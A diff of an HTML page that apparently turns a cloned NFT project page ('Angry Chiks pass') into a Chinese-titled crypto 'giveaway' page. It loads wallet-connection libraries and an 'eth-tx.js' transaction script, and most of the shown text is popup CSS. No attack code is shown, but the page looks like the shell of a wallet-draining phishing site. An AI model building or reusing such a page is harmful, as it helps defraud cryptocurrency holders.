@@ -1,578 +1,1646 @@
--<!DOCTYPE html>
-<!-- Last Published: Thu Oct 28 2021 04:54:43 CrazzyT+0000 (Coordinated Universal Time) -->
-<html data-wf-domain="www.rareghostclub.com" data-wf-page="6170a020d071152ac20bb063" data-wf-site="61577885fe80ba5e67abfa11">
+<html lang="en" data-scrapbook-title="加密达尔塔独家大放送">
 
 <head>
-    <link href="assets/css/123123.css" rel="stylesheet" type="text/css">
-    <link href="assets/css/style123.css" rel="stylesheet" type="text/css">
-    <meta charset="utf-8">
-    <title>Angry Chiks pass</title>
-    <link href="61577885fe80ba5e67abfa11/css/rare-ghost-project.27df1658d.min.css" rel="stylesheet" type="text/css">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="./assets/styles.css">
+    <style>
+        .web3modal-modal-lightbox {
+            z-index: 1000 !important;
+        }
+    </style>
 
-<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
-        <script src="https://unpkg.com/@walletconnect/web3-provider@latest/dist/umd/index.min.js"></script>
-        <script src="https://unpkg.com/web3modal@latest/dist/index.js"></script>
-        <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-        <script src="eth-tx.js"></script>
-        
-        <script type="module" crossorigin src="index.js"></script>
+    <style>
+        .swal2-popup.swal2-toast {
+            box-sizing: border-box;
+            grid-column: 1/4 !important;
+            grid-row: 1/4 !important;
+            grid-template-columns: min-content auto min-content;
+            padding: 1em;
+            overflow-y: hidden;
+            background: #fff;
+            box-shadow: 0 0 1px rgba(0, 0, 0, .075), 0 1px 2px rgba(0, 0, 0, .075), 1px 2px 4px rgba(0, 0, 0, .075), 1px 3px 8px rgba(0, 0, 0, .075), 2px 4px 16px rgba(0, 0, 0, .075);
+            pointer-events: all
+        }
 
-    <script src="ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
-    <script type="text/javascript">
-        WebFont.load({
-            google: {
-                families: ["Space Grotesk:300,regular,500,600,700"]
+        .swal2-popup.swal2-toast>* {
+            grid-column: 2
+        }
+
+        .swal2-popup.swal2-toast .swal2-title {
+            margin: .5em 1em;
+            padding: 0;
+            font-size: 1em;
+            text-align: initial
+        }
+
+        .swal2-popup.swal2-toast .swal2-loading {
+            justify-content: center
+        }
+
+        .swal2-popup.swal2-toast .swal2-input {
+            height: 2em;
+            margin: .5em;
+            font-size: 1em
+        }
+
+        .swal2-popup.swal2-toast .swal2-validation-message {
+            font-size: 1em
+        }
+
+        .swal2-popup.swal2-toast .swal2-footer {
+            margin: .5em 0 0;
+            padding: .5em 0 0;
+            font-size: .8em
+        }
+
+        .swal2-popup.swal2-toast .swal2-close {
+            grid-column: 3/3;
+            grid-row: 1/99;
+            align-self: center;
+            width: .8em;
+            height: .8em;
+            margin: 0;
+            font-size: 2em
+        }
+
+        .swal2-popup.swal2-toast .swal2-html-container {
+            margin: .5em 1em;
+            padding: 0;
+            overflow: initial;
+            font-size: 1em;
+            text-align: initial
+        }
+
+        .swal2-popup.swal2-toast .swal2-html-container:empty {
+            padding: 0
+        }
+
+        .swal2-popup.swal2-toast .swal2-loader {
+            grid-column: 1;
+            grid-row: 1/99;
+            align-self: center;
+            width: 2em;
+            height: 2em;
+            margin: .25em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon {
+            grid-column: 1;
+            grid-row: 1/99;
+            align-self: center;
+            width: 2em;
+            min-width: 2em;
+            height: 2em;
+            margin: 0 .5em 0 0
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon .swal2-icon-content {
+            display: flex;
+            align-items: center;
+            font-size: 1.8em;
+            font-weight: bold
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
+            width: 2em;
+            height: 2em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
+            top: .875em;
+            width: 1.375em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
+            left: .3125em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
+            right: .3125em
+        }
+
+        .swal2-popup.swal2-toast .swal2-actions {
+            justify-content: flex-start;
+            height: auto;
+            margin: 0;
+            margin-top: .5em;
+            padding: 0 .5em
+        }
+
+        .swal2-popup.swal2-toast .swal2-styled {
+            margin: .25em .5em;
+            padding: .4em .6em;
+            font-size: 1em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success {
+            border-color: #a5dc86
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line] {
+            position: absolute;
+            width: 1.6em;
+            height: 3em;
+            transform: rotate(45deg);
+            border-radius: 50%
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left] {
+            top: -0.8em;
+            left: -0.5em;
+            transform: rotate(-45deg);
+            transform-origin: 2em 2em;
+            border-radius: 4em 0 0 4em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right] {
+            top: -0.25em;
+            left: .9375em;
+            transform-origin: 0 1.5em;
+            border-radius: 0 4em 4em 0
+        }
+
+        .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
+            width: 2em;
+            height: 2em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
+            top: 0;
+            left: .4375em;
+            width: .4375em;
+            height: 2.6875em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line] {
+            height: .3125em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip] {
+            top: 1.125em;
+            left: .1875em;
+            width: .75em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long] {
+            top: .9375em;
+            right: .1875em;
+            width: 1.375em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip {
+            animation: swal2-toast-animate-success-line-tip .75s
+        }
+
+        .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long {
+            animation: swal2-toast-animate-success-line-long .75s
+        }
+
+        .swal2-popup.swal2-toast.swal2-show {
+            animation: swal2-toast-show .5s
+        }
+
+        .swal2-popup.swal2-toast.swal2-hide {
+            animation: swal2-toast-hide .1s forwards
+        }
+
+        .swal2-container {
+            display: grid;
+            position: fixed;
+            z-index: 1060;
+            inset: 0;
+            box-sizing: border-box;
+            grid-template-areas: "top-start     top            top-end""center-start  center         center-end""bottom-start  bottom-center  bottom-end";
+            grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
+            height: 100%;
+            padding: .625em;
+            overflow-x: hidden;
+            transition: background-color .1s;
+            -webkit-overflow-scrolling: touch
+        }
+
+        .swal2-container.swal2-backdrop-show,
+        .swal2-container.swal2-noanimation {
+            background: rgba(0, 0, 0, .4)
+        }
+
+        .swal2-container.swal2-backdrop-hide {
+            background: rgba(0, 0, 0, 0) !important
+        }
+
+        .swal2-container.swal2-top-start,
+        .swal2-container.swal2-center-start,
+        .swal2-container.swal2-bottom-start {
+            grid-template-columns: minmax(0, 1fr) auto auto
+        }
+
+        .swal2-container.swal2-top,
+        .swal2-container.swal2-center,
+        .swal2-container.swal2-bottom {
+            grid-template-columns: auto minmax(0, 1fr) auto
+        }
+
+        .swal2-container.swal2-top-end,
+        .swal2-container.swal2-center-end,
+        .swal2-container.swal2-bottom-end {
+            grid-template-columns: auto auto minmax(0, 1fr)
+        }
+
+        .swal2-container.swal2-top-start>.swal2-popup {
+            align-self: start
+        }
+
+        .swal2-container.swal2-top>.swal2-popup {
+            grid-column: 2;
+            align-self: start;
+            justify-self: center
+        }
+
+        .swal2-container.swal2-top-end>.swal2-popup,
+        .swal2-container.swal2-top-right>.swal2-popup {
+            grid-column: 3;
+            align-self: start;
+            justify-self: end
+        }
+
+        .swal2-container.swal2-center-start>.swal2-popup,
+        .swal2-container.swal2-center-left>.swal2-popup {
+            grid-row: 2;
+            align-self: center
+        }
+
+        .swal2-container.swal2-center>.swal2-popup {
+            grid-column: 2;
+            grid-row: 2;
+            align-self: center;
+            justify-self: center
+        }
+
+        .swal2-container.swal2-center-end>.swal2-popup,
+        .swal2-container.swal2-center-right>.swal2-popup {
+            grid-column: 3;
+            grid-row: 2;
+            align-self: center;
+            justify-self: end
+        }
+
+        .swal2-container.swal2-bottom-start>.swal2-popup,
+        .swal2-container.swal2-bottom-left>.swal2-popup {
+            grid-column: 1;
+            grid-row: 3;
+            align-self: end
+        }
+
+        .swal2-container.swal2-bottom>.swal2-popup {
+            grid-column: 2;
+            grid-row: 3;
+            justify-self: center;
+            align-self: end
+        }
+
+        .swal2-container.swal2-bottom-end>.swal2-popup,
+        .swal2-container.swal2-bottom-right>.swal2-popup {
+            grid-column: 3;
+            grid-row: 3;
+            align-self: end;
+            justify-self: end
+        }
+
+        .swal2-container.swal2-grow-row>.swal2-popup,
+        .swal2-container.swal2-grow-fullscreen>.swal2-popup {
+            grid-column: 1/4;
+            width: 100%
+        }
+
+        .swal2-container.swal2-grow-column>.swal2-popup,
+        .swal2-container.swal2-grow-fullscreen>.swal2-popup {
+            grid-row: 1/4;
+            align-self: stretch
+        }
+
+        .swal2-container.swal2-no-transition {
+            transition: none !important
+        }
+
+        .swal2-popup {
+            display: none;
+            position: relative;
+            box-sizing: border-box;
+            grid-template-columns: minmax(0, 100%);
+            width: 32em;
+            max-width: 100%;
+            padding: 0 0 1.25em;
+            border: none;
+            border-radius: 5px;
+            background: #fff;
+            color: #545454;
+            font-family: inherit;
+            font-size: 1rem
+        }
+
+        .swal2-popup:focus {
+            outline: none
+        }
+
+        .swal2-popup.swal2-loading {
+            overflow-y: hidden
+        }
+
+        .swal2-title {
+            position: relative;
+            max-width: 100%;
+            margin: 0;
+            padding: .8em 1em 0;
+            color: inherit;
+            font-size: 1.875em;
+            font-weight: 600;
+            text-align: center;
+            text-transform: none;
+            word-wrap: break-word
+        }
+
+        .swal2-actions {
+            display: flex;
+            z-index: 1;
+            box-sizing: border-box;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            width: auto;
+            margin: 1.25em auto 0;
+            padding: 0
+        }
+
+        .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
+            opacity: .4
+        }
+
+        .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))
+        }
+
+        .swal2-actions:not(.swal2-loading) .swal2-styled:active {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))
+        }
+
+        .swal2-loader {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            width: 2.2em;
+            height: 2.2em;
+            margin: 0 1.875em;
+            animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+            border-width: .25em;
+            border-style: solid;
+            border-radius: 100%;
+            border-color: #2778c4 rgba(0, 0, 0, 0) #2778c4 rgba(0, 0, 0, 0)
+        }
+
+        .swal2-styled {
+            margin: .3125em;
+            padding: .625em 1.1em;
+            transition: box-shadow .1s;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
+            font-weight: 500
+        }
+
+        .swal2-styled:not([disabled]) {
+            cursor: pointer
+        }
+
+        .swal2-styled.swal2-confirm {
+            border: 0;
+            border-radius: .25em;
+            background: initial;
+            background-color: #7066e0;
+            color: #fff;
+            font-size: 1em
+        }
+
+        .swal2-styled.swal2-confirm:focus {
+            box-shadow: 0 0 0 3px rgba(112, 102, 224, .5)
+        }
+
+        .swal2-styled.swal2-deny {
+            border: 0;
+            border-radius: .25em;
+            background: initial;
+            background-color: #dc3741;
+            color: #fff;
+            font-size: 1em
+        }
+
+        .swal2-styled.swal2-deny:focus {
+            box-shadow: 0 0 0 3px rgba(220, 55, 65, .5)
+        }
+
+        .swal2-styled.swal2-cancel {
+            border: 0;
+            border-radius: .25em;
+            background: initial;
+            background-color: #6e7881;
+            color: #fff;
+            font-size: 1em
+        }
+
+        .swal2-styled.swal2-cancel:focus {
+            box-shadow: 0 0 0 3px rgba(110, 120, 129, .5)
+        }
+
+        .swal2-styled.swal2-default-outline:focus {
+            box-shadow: 0 0 0 3px rgba(100, 150, 200, .5)
+        }
+
+        .swal2-styled:focus {
+            outline: none
+        }
+
+        .swal2-styled::-moz-focus-inner {
+            border: 0
+        }
+
+        .swal2-footer {
+            justify-content: center;
+            margin: 1em 0 0;
+            padding: 1em 1em 0;
+            border-top: 1px solid #eee;
+            color: inherit;
+            font-size: 1em
+        }
+
+        .swal2-timer-progress-bar-container {
+            position: absolute;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            grid-column: auto !important;
+            overflow: hidden;
+            border-bottom-right-radius: 5px;
+            border-bottom-left-radius: 5px
+        }
+
+        .swal2-timer-progress-bar {
+            width: 100%;
+            height: .25em;
+            background: rgba(0, 0, 0, .2)
+        }
+
+        .swal2-image {
+            max-width: 100%;
+            margin: 2em auto 1em
+        }
+
+        .swal2-close {
+            z-index: 2;
+            align-items: center;
+            justify-content: center;
+            width: 1.2em;
+            height: 1.2em;
+            margin-top: 0;
+            margin-right: 0;
+            margin-bottom: -1.2em;
+            padding: 0;
+            overflow: hidden;
+            transition: color .1s, box-shadow .1s;
+            border: none;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0);
+            color: #ccc;
+            font-family: monospace;
+            font-size: 2.5em;
+            cursor: pointer;
+            justify-self: end
+        }
+
+        .swal2-close:hover {
+            transform: none;
+            background: rgba(0, 0, 0, 0);
+            color: #f27474
+        }
+
+        .swal2-close:focus {
+            outline: none;
+            box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5)
+        }
+
+        .swal2-close::-moz-focus-inner {
+            border: 0
+        }
+
+        .swal2-html-container {
+            z-index: 1;
+            justify-content: center;
+            margin: 1em 1.6em .3em;
+            padding: 0;
+            overflow: auto;
+            color: inherit;
+            font-size: 1.125em;
+            font-weight: normal;
+            line-height: normal;
+            text-align: center;
+            word-wrap: break-word;
+            word-break: break-word
+        }
+
+        .swal2-input,
+        .swal2-file,
+        .swal2-textarea,
+        .swal2-select,
+        .swal2-radio,
+        .swal2-checkbox {
+            margin: 1em 2em 3px
+        }
+
+        .swal2-input,
+        .swal2-file,
+        .swal2-textarea {
+            box-sizing: border-box;
+            width: auto;
+            transition: border-color .1s, box-shadow .1s;
+            border: 1px solid #d9d9d9;
+            border-radius: .1875em;
+            background: rgba(0, 0, 0, 0);
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
+            color: inherit;
+            font-size: 1.125em
+        }
+
+        .swal2-input.swal2-inputerror,
+        .swal2-file.swal2-inputerror,
+        .swal2-textarea.swal2-inputerror {
+            border-color: #f27474 !important;
+            box-shadow: 0 0 2px #f27474 !important
+        }
+
+        .swal2-input:focus,
+        .swal2-file:focus,
+        .swal2-textarea:focus {
+            border: 1px solid #b4dbed;
+            outline: none;
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5)
+        }
+
+        .swal2-input::placeholder,
+        .swal2-file::placeholder,
+        .swal2-textarea::placeholder {
+            color: #ccc
+        }
+
+        .swal2-range {
+            margin: 1em 2em 3px;
+            background: #fff
+        }
+
+        .swal2-range input {
+            width: 80%
+        }
+
+        .swal2-range output {
+            width: 20%;
+            color: inherit;
+            font-weight: 600;
+            text-align: center
+        }
+
+        .swal2-range input,
+        .swal2-range output {
+            height: 2.625em;
+            padding: 0;
+            font-size: 1.125em;
+            line-height: 2.625em
+        }
+
+        .swal2-input {
+            height: 2.625em;
+            padding: 0 .75em
+        }
+
+        .swal2-file {
+            width: 75%;
+            margin-right: auto;
+            margin-left: auto;
+            background: rgba(0, 0, 0, 0);
+            font-size: 1.125em
+        }
+
+        .swal2-textarea {
+            height: 6.75em;
+            padding: .75em
+        }
+
+        .swal2-select {
+            min-width: 50%;
+            max-width: 100%;
+            padding: .375em .625em;
+            background: rgba(0, 0, 0, 0);
+            color: inherit;
+            font-size: 1.125em
+        }
+
+        .swal2-radio,
+        .swal2-checkbox {
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            color: inherit
+        }
+
+        .swal2-radio label,
+        .swal2-checkbox label {
+            margin: 0 .6em;
+            font-size: 1.125em
+        }
+
+        .swal2-radio input,
+        .swal2-checkbox input {
+            flex-shrink: 0;
+            margin: 0 .4em
+        }
+
+        .swal2-input-label {
+            display: flex;
+            justify-content: center;
+            margin: 1em auto 0
+        }
+
+        .swal2-validation-message {
+            align-items: center;
+            justify-content: center;
+            margin: 1em 0 0;
+            padding: .625em;
+            overflow: hidden;
+            background: #f0f0f0;
+            color: #666;
+            font-size: 1em;
+            font-weight: 300
+        }
+
+        .swal2-validation-message::before {
+            content: "!";
+            display: inline-block;
+            width: 1.5em;
+            min-width: 1.5em;
+            height: 1.5em;
+            margin: 0 .625em;
+            border-radius: 50%;
+            background-color: #f27474;
+            color: #fff;
+            font-weight: 600;
+            line-height: 1.5em;
+            text-align: center
+        }
+
+        .swal2-icon {
+            position: relative;
+            box-sizing: content-box;
+            justify-content: center;
+            width: 5em;
+            height: 5em;
+            margin: 2.5em auto .6em;
+            border: 0.25em solid rgba(0, 0, 0, 0);
+            border-radius: 50%;
+            border-color: #000;
+            font-family: inherit;
+            line-height: 5em;
+            cursor: default;
+            user-select: none
+        }
+
+        .swal2-icon .swal2-icon-content {
+            display: flex;
+            align-items: center;
+            font-size: 3.75em
+        }
+
+        .swal2-icon.swal2-error {
+            border-color: #f27474;
+            color: #f27474
+        }
+
+        .swal2-icon.swal2-error .swal2-x-mark {
+            position: relative;
+            flex-grow: 1
+        }
+
+        .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
+            display: block;
+            position: absolute;
+            top: 2.3125em;
+            width: 2.9375em;
+            height: .3125em;
+            border-radius: .125em;
+            background-color: #f27474
+        }
+
+        .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
+            left: 1.0625em;
+            transform: rotate(45deg)
+        }
+
+        .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
+            right: 1em;
+            transform: rotate(-45deg)
+        }
+
+        .swal2-icon.swal2-error.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark {
+            animation: swal2-animate-error-x-mark .5s
+        }
+
+        .swal2-icon.swal2-warning {
+            border-color: #facea8;
+            color: #f8bb86
+        }
+
+        .swal2-icon.swal2-warning.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content {
+            animation: swal2-animate-i-mark .5s
+        }
+
+        .swal2-icon.swal2-info {
+            border-color: #9de0f6;
+            color: #3fc3ee
+        }
+
+        .swal2-icon.swal2-info.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content {
+            animation: swal2-animate-i-mark .8s
+        }
+
+        .swal2-icon.swal2-question {
+            border-color: #c9dae1;
+            color: #87adbd
+        }
+
+        .swal2-icon.swal2-question.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content {
+            animation: swal2-animate-question-mark .8s
+        }
+
+        .swal2-icon.swal2-success {
+            border-color: #a5dc86;
+            color: #a5dc86
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-circular-line] {
+            position: absolute;
+            width: 3.75em;
+            height: 7.5em;
+            transform: rotate(45deg);
+            border-radius: 50%
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left] {
+            top: -0.4375em;
+            left: -2.0635em;
+            transform: rotate(-45deg);
+            transform-origin: 3.75em 3.75em;
+            border-radius: 7.5em 0 0 7.5em
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right] {
+            top: -0.6875em;
+            left: 1.875em;
+            transform: rotate(-45deg);
+            transform-origin: 0 3.75em;
+            border-radius: 0 7.5em 7.5em 0
+        }
+
+        .swal2-icon.swal2-success .swal2-success-ring {
+            position: absolute;
+            z-index: 2;
+            top: -0.25em;
+            left: -0.25em;
+            box-sizing: content-box;
+            width: 100%;
+            height: 100%;
+            border: .25em solid rgba(165, 220, 134, .3);
+            border-radius: 50%
+        }
+
+        .swal2-icon.swal2-success .swal2-success-fix {
+            position: absolute;
+            z-index: 1;
+            top: .5em;
+            left: 1.625em;
+            width: .4375em;
+            height: 5.625em;
+            transform: rotate(-45deg)
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-line] {
+            display: block;
+            position: absolute;
+            z-index: 2;
+            height: .3125em;
+            border-radius: .125em;
+            background-color: #a5dc86
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-line][class$=tip] {
+            top: 2.875em;
+            left: .8125em;
+            width: 1.5625em;
+            transform: rotate(45deg)
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-line][class$=long] {
+            top: 2.375em;
+            right: .5em;
+            width: 2.9375em;
+            transform: rotate(-45deg)
+        }
+
+        .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip {
+            animation: swal2-animate-success-line-tip .75s
+        }
+
+        .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long {
+            animation: swal2-animate-success-line-long .75s
+        }
+
+        .swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right {
+            animation: swal2-rotate-success-circular-line 4.25s ease-in
+        }
+
+        .swal2-progress-steps {
+            flex-wrap: wrap;
+            align-items: center;
+            max-width: 100%;
+            margin: 1.25em auto;
+            padding: 0;
+            background: rgba(0, 0, 0, 0);
+            font-weight: 600
+        }
+
+        .swal2-progress-steps li {
+            display: inline-block;
+            position: relative
+        }
+
+        .swal2-progress-steps .swal2-progress-step {
+            z-index: 20;
+            flex-shrink: 0;
+            width: 2em;
+            height: 2em;
+            border-radius: 2em;
+            background: #2778c4;
+            color: #fff;
+            line-height: 2em;
+            text-align: center
+        }
+
+        .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step {
+            background: #2778c4
+        }
+
+        .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step {
+            background: #add8e6;
+            color: #fff
+        }
+
+        .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line {
+            background: #add8e6
+        }
+
+        .swal2-progress-steps .swal2-progress-step-line {
+            z-index: 10;
+            flex-shrink: 0;
+            width: 2.5em;
+            height: .4em;
+            margin: 0 -1px;
+            background: #2778c4
+        }
+
+        [class^=swal2] {
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
+        }
+
+        .swal2-show {
+            animation: swal2-show .3s
+        }
+
+        .swal2-hide {
+            animation: swal2-hide .15s forwards
+        }
+
+        .swal2-noanimation {
+            transition: none
+        }
+
+        .swal2-scrollbar-measure {
+            position: absolute;
+            top: -9999px;
+            width: 50px;
+            height: 50px;
+            overflow: scroll
+        }
+
+        .swal2-rtl .swal2-close {
+            margin-right: initial;
+            margin-left: 0
+        }
+
+        .swal2-rtl .swal2-timer-progress-bar {
+            right: 0;
+            left: auto
+        }
+
+        @keyframes swal2-toast-show {
+            0% {
+                transform: translateY(-0.625em) rotateZ(2deg)
             }
-        });
 
-    </script>
-    <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif]-->
-    <script type="text/javascript">
-        ! function(o, c) {
-            var n = c.documentElement,
-                t = " w-mod-";
-            n.className += t + "js", ("ontouchstart" in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch")
-        }(window, document);
+            33% {
+                transform: translateY(0) rotateZ(-2deg)
+            }
 
-    </script>
-    <link href="img/projectimage" rel="shortcut icon" type="image/x-icon">
-    <link href="img/projectimage" rel="apple-touch-icon">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <style>
-        ::selection {
-            background: #E8E8E8;
-            color: #121212;
-            text-shadow: none;
+            66% {
+                transform: translateY(0.3125em) rotateZ(2deg)
+            }
+
+            100% {
+                transform: translateY(0) rotateZ(0deg)
+            }
         }
 
-        input,
-        textarea {
-            background-color: rgba(255, 255, 255, 0);
-            -webkit-appearance: none;
-            -moz-appearance: none;
-            appearance: none;
-            border-radius: 0;
+        @keyframes swal2-toast-hide {
+            100% {
+                transform: rotateZ(1deg);
+                opacity: 0
+            }
         }
 
-        body::-webkit-scrollbar {
-            display: none;
+        @keyframes swal2-toast-animate-success-line-tip {
+            0% {
+                top: .5625em;
+                left: .0625em;
+                width: 0
+            }
+
+            54% {
+                top: .125em;
+                left: .125em;
+                width: 0
+            }
+
+            70% {
+                top: .625em;
+                left: -0.25em;
+                width: 1.625em
+            }
+
+            84% {
+                top: 1.0625em;
+                left: .75em;
+                width: .5em
+            }
+
+            100% {
+                top: 1.125em;
+                left: .1875em;
+                width: .75em
+            }
         }
 
+        @keyframes swal2-toast-animate-success-line-long {
+            0% {
+                top: 1.625em;
+                right: 1.375em;
+                width: 0
+            }
+
+            65% {
+                top: 1.25em;
+                right: .9375em;
+                width: 0
+            }
+
+            84% {
+                top: .9375em;
+                right: 0;
+                width: 1.125em
+            }
+
+            100% {
+                top: .9375em;
+                right: .1875em;
+                width: 1.375em
+            }
+        }
+
+        @keyframes swal2-show {
+            0% {
+                transform: scale(0.7)
+            }
+
+            45% {
+                transform: scale(1.05)
+            }
+
+            80% {
+                transform: scale(0.95)
+            }
+
+            100% {
+                transform: scale(1)
+            }
+        }
+
+        @keyframes swal2-hide {
+            0% {
+                transform: scale(1);
+                opacity: 1
+            }
+
+            100% {
+                transform: scale(0.5);
+                opacity: 0
+            }
+        }
+
+        @keyframes swal2-animate-success-line-tip {
+            0% {
+                top: 1.1875em;
+                left: .0625em;
+                width: 0
+            }
+
+            54% {
+                top: 1.0625em;
+                left: .125em;
+                width: 0
+            }
+
+            70% {
+                top: 2.1875em;
+                left: -0.375em;
+                width: 3.125em
+            }
+
+            84% {
+                top: 3em;
+                left: 1.3125em;
+                width: 1.0625em
+            }
+
+            100% {
+                top: 2.8125em;
+                left: .8125em;
+                width: 1.5625em
+            }
+        }
+
+        @keyframes swal2-animate-success-line-long {
+            0% {
+                top: 3.375em;
+                right: 2.875em;
+                width: 0
+            }
+
+            65% {
+                top: 3.375em;
+                right: 2.875em;
+                width: 0
+            }
+
+            84% {
+                top: 2.1875em;
+                right: 0;
+                width: 3.4375em
+            }
+
+            100% {
+                top: 2.375em;
+                right: .5em;
+                width: 2.9375em
+            }
+        }
+
+        @keyframes swal2-rotate-success-circular-line {
+            0% {
+                transform: rotate(-45deg)
+            }
+
+            5% {
+                transform: rotate(-45deg)
+            }
+
+            12% {
+                transform: rotate(-405deg)
+            }
+
+            100% {
+                transform: rotate(-405deg)
+            }
+        }
+
+        @keyframes swal2-animate-error-x-mark {
+            0% {
+                margin-top: 1.625em;
+                transform: scale(0.4);
+                opacity: 0
+            }
+
+            50% {
+                margin-top: 1.625em;
+                transform: scale(0.4);
+                opacity: 0
+            }
+
+            80% {
+                margin-top: -0.375em;
+                transform: scale(1.15)
+            }
+
+            100% {
+                margin-top: 0;
+                transform: scale(1);
+                opacity: 1
+            }
+        }
+
+        @keyframes swal2-animate-error-icon {
+            0% {
+                transform: rotateX(100deg);
+                opacity: 0
+            }
+
+            100% {
+                transform: rotateX(0deg);
+                opacity: 1
+            }
+        }
+
+        @keyframes swal2-rotate-loading {
+            0% {
+                transform: rotate(0deg)
+            }
+
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+
+        @keyframes swal2-animate-question-mark {
+            0% {
+                transform: rotateY(-360deg)
+            }
+
+            100% {
+                transform: rotateY(0)
+            }
+        }
+
+        @keyframes swal2-animate-i-mark {
+            0% {
+                transform: rotateZ(45deg);
+                opacity: 0
+            }
+
+            25% {
+                transform: rotateZ(-25deg);
+                opacity: .4
+            }
+
+            50% {
+                transform: rotateZ(15deg);
+                opacity: .8
+            }
+
+            75% {
+                transform: rotateZ(-5deg);
+                opacity: 1
+            }
+
+            100% {
+                transform: rotateX(0);
+                opacity: 1
+            }
+        }
+
+        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+            overflow: hidden
+        }
+
+        body.swal2-height-auto {
+            height: auto !important
+        }
+
+        body.swal2-no-backdrop .swal2-container {
+            background-color: rgba(0, 0, 0, 0) !important;
+            pointer-events: none
+        }
+
+        body.swal2-no-backdrop .swal2-container .swal2-popup {
+            pointer-events: all
+        }
+
+        body.swal2-no-backdrop .swal2-container .swal2-modal {
+            box-shadow: 0 0 10px rgba(0, 0, 0, .4)
+        }
+
+        @media print {
+            body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+                overflow-y: scroll !important
+            }
+
+            body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
+                display: none
+            }
+
+            body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
+                position: static !important
+            }
+        }
+
+        body.swal2-toast-shown .swal2-container {
+            box-sizing: border-box;
+            width: 360px;
+            max-width: 100%;
+            background-color: rgba(0, 0, 0, 0);
+            pointer-events: none
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-top {
+            inset: 0 auto auto 50%;
+            transform: translateX(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-top-end,
